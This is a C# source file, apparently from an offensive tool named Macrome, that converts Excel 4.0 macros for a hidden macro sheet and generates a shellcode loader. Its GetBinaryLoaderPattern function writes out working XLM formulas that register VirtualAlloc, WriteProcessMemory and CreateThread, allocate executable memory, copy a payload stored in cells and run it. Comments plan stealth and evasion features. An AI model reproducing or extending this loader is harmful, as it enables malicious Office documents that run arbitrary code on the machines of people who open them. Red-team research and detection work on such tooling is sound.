using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using b2xtranslator.Spreadsheet.XlsFileFormat;
using b2xtranslator.xls.XlsFileFormat.Records;

namespace Macrome
{
    public static class MacroPatterns
    {
        public const string MacroColumnSeparator = ";;;;;";

        private static int GetColNumberFromExcelA1ColName(string colName)
        {
            if (colName.Length == 1)
            {
                return (int) Convert.ToByte(colName[0]) - (int) 'A' + 1;
            }
            else
            {
                return ((int)Convert.ToByte(colName[0]) - (int)'A' + 1) * 26 + 
                       ((int)Convert.ToByte(colName[1]) - (int)'A' + 1);
            }
        }
        private static string ConvertA1ToR1C1(string a1)
        {
            string colString = new string(a1.TakeWhile(c => !Char.IsNumber(c)).ToArray());
            int rowNum = Int32.Parse(new string(a1.TakeLast(a1.Length - colString.Length).ToArray()));
            int colNum = GetColNumberFromExcelA1ColName(colString);
            return string.Format("R{0}C{1}", rowNum, colNum);
        }

        //Excel variable names must start with a valid letter, then they can include numbers
        private static bool IsValidVariableNameCharacter(char c, bool allowNumbers = false)
        {
            //A-Z, a-z, ƒ (131), Š(140), Ž(142), š(154), œ(156), ž(158), Ÿ(159), ª(170), µ(181), º(186)
            //Everything equal to or past 192 except ×(215) and ÷(247)
            if (c >= 'A' && c <= 'Z') return true;
            if (c >= 'a' && c <= 'z') return true;

            if (allowNumbers && (c >= '0' && c <= '9')) return true;

            if (c == (char) 215 || c == (char) 247) return false;

            int[] validCharCodes = new int[] {131, 140, 142, 154, 156, 158, 159, 170, 181, 186};
            if (validCharCodes.Any(code => c == (char) code)) return true;

            if ((int) c >= 192) return true;

            return false;
        }

        private static bool LooksLikeVariableAssignment(string formula)
        {
            try
            {
                //Make sure the first character isn't a number, but is a valid variable character
                if (IsValidVariableNameCharacter(formula[0]))
                {
                    char firstNonVariableCharacter =
                        formula.SkipWhile(c => IsValidVariableNameCharacter(c, true)).First();
                    if (firstNonVariableCharacter == '=')
                    {
                        return true;
                    }
                }
            }
            catch (Exception)
            {
                //If every character is a valid variable name, then .First() will return nothing
            }

            return false;
        }


        /// <summary>
        /// Refactor/Replace formulas using ACTIVE.CELL + SELECT to use something
        /// that's more friendly for multi-sheet excel docs.
        /// </summary>
        /// <param name="cellFormula"></param>
        /// <param name="variableName"></param>
        /// <returns></returns>
        public static string ReplaceSelectActiveCellFormula(string cellFormula, string variableName = "šœƒ")
        {
            if (cellFormula.Contains("ACTIVE.CELL()"))
            {
                cellFormula = cellFormula.Replace("ACTIVE.CELL()", variableName);
            }

            string selectRegex = @"=SELECT\(.*?\)";
            string selectRelativeRegex = @"=SELECT\(.*(R(\[\d+\]){0,1}C(\[\d+\]){0,1}).*?\)";

            Regex sRegex = new Regex(selectRegex);
            Regex srRegex = new Regex(selectRelativeRegex);
            Match sRegexMatch = sRegex.Match(cellFormula);
            if (sRegexMatch.Success)
            {
                Match srRegexMatch = srRegex.Match(cellFormula);
                string selectStringMatch = sRegexMatch.Value;
                //We have a line like =SELECT(,"R[1]C")
                if (srRegexMatch.Success)
                {
                    string relAddress = srRegexMatch.Groups[1].Value;
                    string relReplace = cellFormula.Replace(selectStringMatch,
                        string.Format("{0}=ABSREF(\"{1}\",{0})", variableName, relAddress));
                    return relReplace;
                }
                //We have a line like =SELECT(B1:B111,B1)
                else
                {
                    string targetCell = selectStringMatch.Split(",").Last().Split(')').First();
                    string varAssign = cellFormula.Replace(selectStringMatch,
                        string.Format("{0}={1}", variableName, targetCell));
                    return varAssign;
                }
            }

            return cellFormula;
        }

        private static string ImportCellFormula(string cellFormula)
        {
            if (cellFormula.Length == 0) return cellFormula;

            string newCellFormula = cellFormula;

            //Unescape the "s if we are looking at a CellFormula that has been escaped
            if (newCellFormula.StartsWith('"'))
            {
                //Strip the outer quotes
                newCellFormula = new string(newCellFormula.Skip(1).Take(newCellFormula.Length - 2).ToArray());

                //Escape the inside content
                newCellFormula = ExcelHelperClass.UnescapeFormulaString(newCellFormula);
            }

            //Replace any uses of SELECT and ACTIVE.CELL with variable usage to better enable the sheet being hidden
            //Mainly for use with importing EXCELntDonut macros
            newCellFormula = ReplaceSelectActiveCellFormula(newCellFormula);

            //Remap A1 style references to R1C1
            string a1pattern = @"[A-Z]{1,2}\d{1,5}";
            Regex rg = new Regex(a1pattern);
            MatchCollection matches = rg.Matches(newCellFormula);
            int stringLenChange = 0;

            //Iterate through each match and then replace it at its offset. We iterate through 
            //each case manually to prevent overlapping cases from double replacing - ex: SELECT(B1:B111,B1)
            foreach (var match in matches)
            {
                string matchString = ((Match)match).Value;
                string replaceContent = ConvertA1ToR1C1(matchString);
                //As we change the string, these indexes will go out of sync, track the size delta to make sure we resync positions
                int matchIndex = ((Match) match).Index + stringLenChange;

                //LINQ replacement for python string slicing
                newCellFormula = new string(newCellFormula.Take(matchIndex).
                    Concat(replaceContent.ToArray()).
                    Concat(newCellFormula.TakeLast(newCellFormula.Length - matchIndex - matchString.Length)).ToArray());

                stringLenChange += (replaceContent.Length - matchString.Length);
            }

            int charReplacements = 0;
            //Remap CHAR() to actual bytes
            for (int i = 1; i <= 255; i += 1)
            {
                int oldLength = newCellFormula.Length;
                newCellFormula = newCellFormula.Replace(string.Format("CHAR({0})&", i), "" + (char) i);
                newCellFormula = newCellFormula.Replace(string.Format("CHAR({0})", i), "" + (char)i);

                //Update our poor heuristic for when we're getting a cell that is just CHAR()&CHAR()&CHAR()&CHAR()...
                if (oldLength != newCellFormula.Length)
                {
                    double lengthDelta = oldLength - newCellFormula.Length;
                    charReplacements += (int)Math.Floor(lengthDelta / 6.0);
                }
            }
            
            //Arbitrary metric to determine if we should convert this to a string cell vs. formula cell
            if (charReplacements > 3 && newCellFormula[0] == '=')
            {
                newCellFormula = new string(newCellFormula.Skip(1).ToArray());

                //Excel cells will also check to see if we are a variable assignment cell:
                //if we have valid variable letters before an =, it will process the assignment value
                bool looksLikeVariableAssignment = LooksLikeVariableAssignment(newCellFormula);

                //If we have a raw string content that starts with = or @, we can wrap this with ="" and it will work
                //If the string content is already 255 bytes though, this won't work (FORMULA will fail trying to write the 258 byte string)
                //If we're close to the limit then populate the cell with =CHAR(w/e)&Ref to cell with remainder of the content
                if (newCellFormula.StartsWith('=') || newCellFormula.StartsWith('@') || looksLikeVariableAssignment)
                {
                    //Need to make sure there's room for inserting 3 more characters =""
                    if (newCellFormula.Length >= 255 - 3)
                    {
                        //If this is a max length cell (common with 255 byte increments of shellcode)
                        //then mark the macro with a marker and we'll break it into two cells when we're building the sheet
                        return FormulaHelper.TOOLONGMARKER + newCellFormula;
                    }
                    else
                    {
                        newCellFormula = string.Format("=\"{0}\"", newCellFormula);
                    }
                    
                }
            }
            else
            {
                //TODO Use a proper logging package and log this as DEBUG info
                // Console.WriteLine(newCellFormula);
            }

            if (newCellFormula.Length > 255)
            {
                throw new ArgumentException(string.Format("Imported Cell Formula is too long - length must be 255 or less:\n{0}", newCellFormula));
            }


            return newCellFormula;
        }

        // Imported Macros that perform obfuscation or contain binary information stored via
        // =CHAR() can create a situation where the =FORMULA() function will not work.
        // Technically a cell can only contain up to 255 characters of string content -
        // this limitation also applies to FORMULA input. So while a string of A&B&C&D&E&...
        // can technically go up to 8192 characters in length in a cell, the output must
        // still only be 255 characters or the result of the formula will be #VALUE!.
        // Unfortunately this means we can't use FORMULA to reproduce all valid
        // string content either - an 8192 character formula doesn't fit into 255 characters
        // so FORMULA will reject it.
        // 
        // In order to support macros which contain binary information and/or have been
        // slightly obfuscated, we need to manually convert the CHAR() output back into
        // the original binary characters. If this still isn't enough and a single cell
        // is > 255 characters, we need to reject the macro input and throw an error.
        // 
        // Additionally, any A1 references must be changed to R1C1 style. Not sure
        // why this is the case, but this seems to be the default for FORMULA() invocations.

        /// <summary>
        /// Converts a series of Excel 4 Macros into a format that Macrome can write to a hidden Macro sheet.
        /// </summary>
        /// <param name="macrosToImport">A list of strings containing macros. Each string represents a row. Cells are separated by semicolons.</param>
        /// <returns></returns>
        public static List<String> ImportMacroPattern(List<string> macrosToImport)
        {
            List<string> importedMacros = new List<string>();

            foreach (var macro in macrosToImport)
            {
                List<string> cellContent = macro.Split(";").ToList();
                //Replace the single ; separator with an unlikely separator like ;;;;; since shellcode can contain a single ;
                string importedMacro = string.Join(MacroColumnSeparator, cellContent.Select(ImportCellFormula));
                importedMacros.Add(importedMacro);
            }

            return importedMacros;
        }

        public static List<String> GetBinaryLoaderPattern(List<string> preamble, string macroSheetName)
        {
            int offset;
            if (preamble.Count == 0)
            {
                offset = 1;
            } else
            {
                offset = preamble.Count;
            }
            //TODO Autocalculate these values at generation time
            //These variables assume certain positions in generated macros
            //Col 1 is our obfuscated payload
            //Col 2 is our actual macro set defined below
            //Col 3 is a separated set of cells containing a binary payload, ends with the string END
            string lengthCounter = String.Format("R{0}C4", offset);
            string offsetCounter = String.Format("R{0}C4", offset + 1);
            string dataCellRef = String.Format("R{0}C4", offset + 2);
            string dataCol = "C3";

            //Expects our invocation of VirtualAlloc to be on row 5, but this will change if the macro changes
            string baseMemoryAddress = String.Format("R{0}C2", preamble.Count + 4); //for some reason this only works when its count, not offset

            //TODO [Stealth] Add VirtualProtect so we don't call VirtualAlloc with RWX permissions
            //TODO [Functionality] Apply x64 support changes from https://github.com/outflanknl/Scripts/blob/master/ShellcodeToJScript.js
            //TODO [Functionality] Add support for .NET payloads (https://docs.microsoft.com/en-us/dotnet/core/tutorials/netcore-hosting, https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/)
            List<string> macros = new List<string>()
            {
                "=REGISTER(\"Kernel32\",\"VirtualAlloc\",\"JJJJJ\",\"VA\",,1,0)",
                "=REGISTER(\"Kernel32\",\"CreateThread\",\"JJJJJJJ\",\"CT\",,1,0)",
                "=REGISTER(\"Kernel32\",\"WriteProcessMemory\",\"JJJCJJ\",\"WPM\",,1,0)",
                "=VA(0,1000000,4096,64)", //Referenced by baseMemoryAddress
                string.Format("=SET.VALUE({0}!{1}, 0)", macroSheetName, lengthCounter),
                string.Format("=SET.VALUE({0}!{1},1)", macroSheetName, offsetCounter),
                string.Format("=FORMULA(\"={0}!R\"&{0}!{1}&\"{2}\",{0}!{3})", macroSheetName, offsetCounter, dataCol, dataCellRef),
                string.Format("=WHILE(GET.CELL(5,{0}!{1})<>\"END\")", macroSheetName, dataCellRef),
                string.Format("=WPM(-1,{0}!{1}+{0}!{2},{0}!{3},LEN({0}!{3}),0)", macroSheetName, baseMemoryAddress, lengthCounter, dataCellRef),
                string.Format("=SET.VALUE({0}!{1}, {0}!{1} + 1)", macroSheetName, offsetCounter),
                string.Format("=SET.VALUE({0}!{1}, {0}!{1} + LEN({0}!{2}))", macroSheetName, lengthCounter, dataCellRef),
                string.Format("=FORMULA(\"={0}!R\"&{0}!{1}&\"{2}\",{0}!{3})", macroSheetName, offsetCounter, dataCol, dataCellRef),
                "=NEXT()",
                //Execute our Payload
                string.Format("=CT(0,0,{0}!{1},0,0,0)", macroSheetName, baseMemoryAddress),
                "=WAIT(NOW()+\"00:00:03\")",
                "=HALT()"
            };
            if (preamble.Count > 0)
            {
                preamble.AddRange(macros);
                return preamble;
            }
            return macros;
        }

        public static List<String> GetBinaryLoader64bitPattern(string macroSheetName)
        {
            throw new NotImplementedException();
        }
    }
}
